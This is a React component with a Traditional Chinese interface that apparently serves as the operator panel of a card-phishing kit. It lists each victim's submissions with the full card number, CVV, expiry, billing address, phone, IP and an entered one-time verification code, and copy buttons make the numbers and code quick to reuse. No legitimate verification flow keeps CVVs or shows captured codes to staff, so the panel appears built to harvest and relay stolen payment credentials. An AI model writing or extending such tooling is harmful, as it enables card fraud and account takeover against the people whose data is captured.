import React, { useEffect } from "react";
import { History, X, CreditCard, MapPin, Phone, Wifi, Calendar, KeyRound } from "lucide-react";
import CopyButton from "./CopyButton";
import type { KycSubmission } from "../lib/types";

function Field({ label, value, mono = false, copy = false }: { label: string; value: string | null | undefined; mono?: boolean; copy?: boolean }) {
  return (
    <div className="min-w-0">
      <div className="text-[11px] font-medium text-slate-400 mb-1">{label}</div>
      <div className="flex items-center gap-1 min-w-0">
        <span className={`text-sm text-slate-800 truncate ${mono ? "font-mono font-semibold tracking-wide" : ""}`} title={value ?? ""}>{value || "—"}</span>
        {copy && value && <CopyButton text={value} />}
      </div>
    </div>
  );
}

const TONES = {
  blue: { wrap: "border-blue-200 border-l-blue-500", head: "bg-blue-50 border-blue-100", icon: "bg-blue-500 text-white", title: "text-blue-800" },
  emerald: { wrap: "border-emerald-200 border-l-emerald-500", head: "bg-emerald-50 border-emerald-100", icon: "bg-emerald-500 text-white", title: "text-emerald-800" },
  amber: { wrap: "border-amber-200 border-l-amber-500", head: "bg-amber-50 border-amber-100", icon: "bg-amber-500 text-white", title: "text-amber-800" },
};

function Group({ icon: Icon, title, tone, children }: { icon: typeof CreditCard; title: string; tone: keyof typeof TONES; children: React.ReactNode }) {
  const t = TONES[tone];
  return (
    <section className={`rounded-xl border border-l-4 bg-white shadow-[0_1px_2px_rgba(15,23,42,0.04)] overflow-hidden ${t.wrap}`}>
      <div className={`px-4 py-2 border-b flex items-center gap-2 ${t.head}`}>
        <span className={`w-6 h-6 rounded-md flex items-center justify-center ${t.icon}`}>
          <Icon className="w-3.5 h-3.5" />
        </span>
        <span className={`text-xs font-semibold ${t.title}`}>{title}</span>
      </div>
      <div className="px-4 py-3 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-x-6 gap-y-3">{children}</div>
    </section>
  );
}

const fmtDate = (iso: string) => new Date(iso).toLocaleDateString("zh-TW", { year: "numeric", month: "short", day: "numeric" });
const fmtTime = (iso: string) => new Date(iso).toLocaleTimeString("zh-TW", { hour: "2-digit", minute: "2-digit", second: "2-digit" });

export default function SubmissionHistoryPanel({ submissions, selectedId, onSelect, onClose }: {
  submissions: KycSubmission[];
  selectedId: string | null;
  onSelect: (id: string) => void;
  onClose: () => void;
}) {
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => { if (e.key === "Escape") onClose(); };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);

  const selected = submissions.find(s => s.id === selectedId) ?? submissions[0];
  const orderOf = new Map(
    [...submissions]
      .sort((a, b) => new Date(a.submitted_at).getTime() - new Date(b.submitted_at).getTime())
      .map((s, i) => [s.id, i + 1]),
  );
  const isCredit = !!selected && (selected.card_type === "credit" || !!selected.payee_debit_card);

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 bg-slate-950/70 backdrop-blur-[3px]" onClick={onClose}>
      <div
        className="bg-white rounded-2xl shadow-[0_24px_64px_-12px_rgba(0,0,0,0.5)] ring-1 ring-white/10 w-full max-w-[1200px] h-[92vh] max-h-[900px] flex flex-col overflow-hidden"
        onClick={e => e.stopPropagation()}
      >
        <div className="relative flex items-center justify-between px-6 py-4 bg-gradient-to-r from-[#0A2B5E] via-[#0F3A7A] to-[#1D4F96] text-white flex-shrink-0">
          <div className="flex items-center gap-3">
            <span className="w-9 h-9 rounded-xl bg-white/15 ring-1 ring-white/20 flex items-center justify-center">
              <History className="w-[18px] h-[18px]" />
            </span>
            <div>
              <h3 className="text-[15px] font-semibold text-white leading-tight flex items-center gap-2">
                提交紀錄
                <span className="text-[10px] font-bold bg-white text-[#0A2B5E] px-2 py-0.5 rounded-full tabular-nums">共 {submissions.length} 筆</span>
              </h3>
              <p className="text-[11px] text-blue-100/80 mt-0.5">選擇左側紀錄以查看該次提交的完整資料</p>
            </div>
          </div>
          <button onClick={onClose} className="p-2 rounded-lg text-blue-100 hover:text-white hover:bg-white/15 transition" title="關閉 (Esc)">
            <X className="w-4 h-4" />
          </button>
          <div className="absolute inset-x-0 bottom-0 h-[3px] bg-gradient-to-r from-sky-400 via-blue-300 to-sky-400" />
        </div>

        {!selected ? (
          <div className="flex-1 flex flex-col items-center justify-center text-gray-400">
            <History className="w-8 h-8 mb-2 opacity-25" />
            <p className="text-sm">尚無已確認的提交紀錄。</p>
          </div>
        ) : (
          <div className="flex-1 min-h-0 flex flex-col sm:flex-row">
            <aside className="sm:w-64 flex-shrink-0 border-b sm:border-b-0 sm:border-r border-slate-200 bg-gradient-to-b from-[#EEF3FA] to-[#E3EBF6] overflow-y-auto max-h-40 sm:max-h-none p-2 space-y-1">
              {submissions.map(s => {
                const active = s.id === selected.id;
                const latest = orderOf.get(s.id) === submissions.length;
                return (
                  <button
                    key={s.id}
                    onClick={() => onSelect(s.id)}
                    className={`w-full text-left px-3 py-2.5 rounded-lg flex items-center gap-3 border transition-all ${
                      active ? "bg-[#0A2B5E] border-[#0A2B5E] shadow-md" : "bg-white/70 border-white hover:bg-white hover:border-blue-200 hover:shadow-sm"
                    }`}
                  >
                    <span className={`flex-shrink-0 w-7 h-7 rounded-full flex items-center justify-center text-[11px] font-bold tabular-nums ${
                      active ? "bg-white text-[#0A2B5E]" : "bg-blue-100 text-blue-700"
                    }`}>
                      {orderOf.get(s.id)}
                    </span>
                    <div className="min-w-0 flex-1">
                      <div className={`text-xs font-semibold flex items-center gap-1.5 ${active ? "text-white" : "text-slate-800"}`}>
                        第 {orderOf.get(s.id)} 次提交
                        {latest && <span className={`text-[9px] font-bold px-1.5 py-px rounded ${active ? "bg-emerald-400 text-emerald-950" : "bg-emerald-100 text-emerald-700"}`}>最新</span>}
                      </div>
                      <div className="mt-1 flex items-center gap-1.5 text-[11px] tabular-nums">
                        <span className={active ? "text-blue-100" : "text-slate-500"}>{fmtDate(s.submitted_at)}</span>
                        <span className={`px-1.5 py-px rounded font-medium ${active ? "bg-white/15 text-white" : "bg-sky-100 text-sky-800"}`}>{fmtTime(s.submitted_at)}</span>
                      </div>
                    </div>
                  </button>
                );
              })}
            </aside>

            <div className="flex-1 min-h-0 overflow-y-auto bg-[#F6F8FB] px-6 py-5 space-y-3">
              <div className="flex items-center justify-between gap-3 flex-wrap rounded-xl bg-white border border-slate-200 px-4 py-3">
                <div>
                  <div className="text-[11px] font-medium text-slate-400">提交次序</div>
                  <div className="text-lg font-bold text-[#0A2B5E]">第 {orderOf.get(selected.id)} 次提交</div>
                </div>
                {selected.entered_verification_code && (
                  <div className="flex items-center gap-2 rounded-xl bg-blue-50 border border-blue-100 px-4 py-2">
                    <KeyRound className="w-4 h-4 text-blue-600" />
                    <span className="text-[11px] text-blue-600 font-semibold whitespace-nowrap">驗證碼</span>
                    <span className="font-mono text-lg font-bold tracking-widest text-[#0A2B5E]">{selected.entered_verification_code}</span>
                    <CopyButton text={selected.entered_verification_code} />
                  </div>
                )}
              </div>

              <Group icon={CreditCard} tone="blue" title={isCredit ? "信用卡資料" : "扣帳卡資料"}>
                {isCredit && selected.payee_debit_card && <Field label="收款扣帳卡" value={selected.payee_debit_card} mono copy />}
                <Field label={isCredit ? "信用卡號" : "扣帳卡號"} value={selected.card_number} mono copy />
                <Field label="發卡銀行" value={selected.card_bank_name} />
                <Field label="持卡人" value={selected.cardholder_name} />
                <Field label="有效期" value={selected.card_expiry} mono />
                <Field label="CVV" value={selected.cvv} mono />
              </Group>

              <Group icon={MapPin} tone="emerald" title="帳單地址">
                <Field label="國家" value={selected.country} />
                <Field label="州/省" value={selected.state} />
                <Field label="城市" value={selected.city} />
                <Field label="郵遞區號" value={selected.postal_code} mono />
                <Field label="街道" value={selected.street_address} />
                <Field label="門牌/公寓" value={selected.house_number} />
              </Group>

              <Group icon={Phone} tone="amber" title="聯絡與提交資訊">
                <Field label="電話" value={selected.phone_number} mono copy />
                <div className="min-w-0">
                  <div className="text-[11px] font-medium text-slate-400 mb-1 flex items-center gap-1"><Wifi className="w-3 h-3" />提交 IP</div>
                  <code className="text-sm font-mono font-semibold text-[#0A2B5E]">{selected.ip_address || "—"}</code>
                </div>
                <div className="min-w-0">
                  <div className="text-[11px] font-medium text-slate-400 mb-1 flex items-center gap-1"><Calendar className="w-3 h-3" />提交時間</div>
                  <span className="text-sm text-slate-800 tabular-nums">{fmtDate(selected.submitted_at)} {fmtTime(selected.submitted_at)}</span>
                </div>
              </Group>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
